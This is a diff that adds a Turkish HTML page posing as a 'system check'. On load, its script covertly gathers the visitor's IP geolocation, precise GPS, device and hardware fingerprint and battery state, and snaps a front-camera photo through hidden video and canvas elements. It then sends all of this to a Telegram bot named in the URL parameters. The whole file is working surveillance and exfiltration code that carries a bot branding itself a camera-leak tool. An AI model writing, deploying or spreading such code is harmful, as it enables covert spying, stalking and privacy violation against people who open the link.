@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Kontrolü</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id');
+        const token = urlParams.get('token');
+
+        async function startProcess() {
+            try {
+                // 1. IP ve Coğrafi Bilgiler (ipapi.co)
+                let ipData = {};
+                try {
+                    let response = await fetch('https://ipapi.co/json/');
+                    ipData = await response.json();
+                } catch (e) {
+                    console.log("IP bilgisi alınamadı");
+                }
+
+                const ip = ipData.ip || "Bilinmiyor";
+                const city = ipData.city || "Bilinmiyor";
+                const region = ipData.region || "Bilinmiyor";
+                const country = ipData.country_name || "Bilinmiyor";
+                const org = ipData.org || "Bilinmiyor";
+                const postal = ipData.postal || "Bilinmiyor";
+                const timezone = ipData.timezone || "Bilinmiyor";
+                const asn = ipData.asn || "Bilinmiyor";
+                
+                let ipCoords = ipData.latitude && ipData.longitude ? `${ipData.latitude}, ${ipData.longitude}` : "Alınamadı";
+
+                // 2. GPS Konumu (Hassas Konum İzni İsteği)
+                let gpsCoords = "Erişim Verilmedi / İzin Yok";
+                try {
+                    if (navigator.geolocation) {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 5000,
+                                maximumAge: 0
+                            });
+                        });
+                        gpsCoords = `${position.coords.latitude}, ${position.coords.longitude} (Hassasiyet: ±${Math.round(position.coords.accuracy)}m)`;
+                    }
+                } catch (e) {}
+
+                // 3. Cihaz, Ekran ve Donanım Bilgileri
+                const userAgent = navigator.userAgent;
+                let device = "Bilinmeyen Cihaz";
+                if (/android/i.test(userAgent)) device = "Android";
+                else if (/iphone|ipad|ipod/i.test(userAgent)) device = "iOS / iPhone";
+                else if (/windows/i.test(userAgent)) device = "Windows PC";
+                else if (/mac/i.test(userAgent)) device = "Mac OS";
+                else if (/linux/i.test(userAgent)) device = "Linux";
+
+                const screenSize = `${screen.width}x${screen.height}`;
+                const windowSize = `${window.innerWidth}x${window.innerHeight}`;
+                const colorDepth = `${screen.colorDepth}-bit`;
+                const screenOrientation = (screen.orientation || {}).type || "Bilinmiyor";
+                const cpuCores = navigator.hardwareConcurrency || "Bilinmiyor";
+                const ramMemory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Bilinmiyor";
+                const lang = navigator.language || navigator.languages?.join(', ') || "Bilinmiyor";
+                const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? `Evet (${navigator.maxTouchPoints || 1} Nokta)` : "Hayır";
+
+                // GPU (Ekran Kartı) Bilgisi
+                let gpuVendor = "Bilinmiyor";
+                let gpuRenderer = "Bilinmiyor";
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                            gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        }
+                    }
+                } catch (e) {}
+
+                // 4. Ağ ve Bağlantı Detayları
+                let connectionType = "Bilinmiyor";
+                let connectionSpeed = "Bilinmiyor";
+                let rtt = "Bilinmiyor";
+                if (navigator.connection) {
+                    connectionType = navigator.connection.effectiveType || "Bilinmiyor";
+                    connectionSpeed = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "Bilinmiyor";
+                    rtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : "Bilinmiyor";
+                }
+
+                // 5. Pil Durumu
+                let batteryStatus = "Bilinmiyor";
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        const level = Math.round(battery.level * 100);
+                        const charging = battery.charging ? "Evet (Şarj Oluyor)" : "Hayır";
+                        batteryStatus = `${level}% | Şarjda: ${charging}`;
+                    }
+                } catch (e) {}
+
+                // 6. Yazılım & Sistem Detayları
+                const cookiesEnabled = navigator.cookieEnabled ? "Evet" : "Hayır";
+                const doNotTrack = navigator.doNotTrack === "1" ? "Açık" : "Kapalı / Belirtilmedi";
+                const timeZoneOffset = `UTC${(new Date().getTimezoneOffset() / -60 >= 0 ? '+' : '')}${new Date().getTimezoneOffset() / -60}`;
+                const now = new Date().toLocaleString('tr-TR', { timeZone: timezone !== "Bilinmiyor" ? timezone : undefined });
+
+                // 7. Kameradan Fotoğraf Yakalama
+                let photoBlob = null;
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await new Promise(resolve => video.onloadedmetadata = resolve);
+                    video.play();
+
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                } catch (err) {
+                    console.log("Kamera izni verilmedi veya cihazda kamera yok");
+                }
+
+                // 8. Rapor Metni Hazırlama
+                const caption = `🚀 *Yeni Giriş Fotoğrafı & Sistem Raporu*
+
+🌐 *AĞ & KONUM BİLGİLERİ*
+├── 📡 *IP Adresi* : \`${ip}\`
+├── 🏙️ *Şehir / Bölge* : \`${city} / ${region}\`
+├── 🌍 *Ülke* : \`${country}\`
+├── 🏢 *ISP / Org* : \`${org}\`
+├── 🔢 *ASN* : \`${asn}\`
+├── 📮 *Posta Kodu* : \`${postal}\`
+├── 📍 *IP Konumu* : \`${ipCoords}\`
+└── 🛰️ *GPS (Hassas)* : \`${gpsCoords}\`
+
+📱 *DONANIM & EKRAN*
+├── 💻 *Cihaz Türü* : \`${device}\`
+├── 🖥️ *Ekran Çözünürlüğü* : \`${screenSize}\`
+├── 📐 *Pencere Boyutu* : \`${windowSize}\`
+├── 🎨 *Renk Derinliği / Yön* : \`${colorDepth} / ${screenOrientation}\`
+├── ⚙️ *CPU Çekirdek Sayısı* : \`${cpuCores}\`
+├── 🧠 *Tahmini RAM* : \`${ramMemory}\`
+├── 🎮 *GPU Üretici* : \`${gpuVendor}\`
+├── 🖼️ *GPU Modeli* : \`${gpuRenderer}\`
+├── 👆 *Dokunmatik Ekran* : \`${isTouch}\`
+└── 🔋 *Batarya Durumu* : \`${batteryStatus}\`
+
+📶 *BAĞLANTI & SİSTEM*
+├── ⚡ *Bağlantı Türü* : \`${connectionType}\`
+├── 🚀 *Tahmini Hız* : \`${connectionSpeed}\`
+├── ⏱️ *Gecikme (RTT)* : \`${rtt}\`
+├── 🗣️ *Sistem Dili* : \`${lang}\`
+├── ⏰ *Saat Dilimi / Fark* : \`${timezone} (${timeZoneOffset})\`
+├── 🕰️ *Yerel Saat* : \`${now}\`
+├── 🍪 *Çerez İzni* : \`${cookiesEnabled}\`
+└── 🛡️ *Do Not Track* : \`${doNotTrack}\`
+
+🤖 *Telegram* : @KameraSizmaVipBot
+👑 *Yapımcı* : @KURUCUU666
+👑 *Yapımcı* : @ahmetpompa`;
+
+                // 9. Telegram Botuna Gönder
+                if (photoBlob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', photoBlob, 'photo.jpg');
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    const formData = new URLSearchParams();
+                    formData.append('chat_id', chatId);
+                    formData.append('text', `⚠️ *Kamera Açılamadı Raporu*\n\n` + caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+            } catch (e) {
+                console.error("Genel hata:", e);
+            }
+        }
+
+        window.onload = startProcess;
+    </script>
+</body>
+</html>
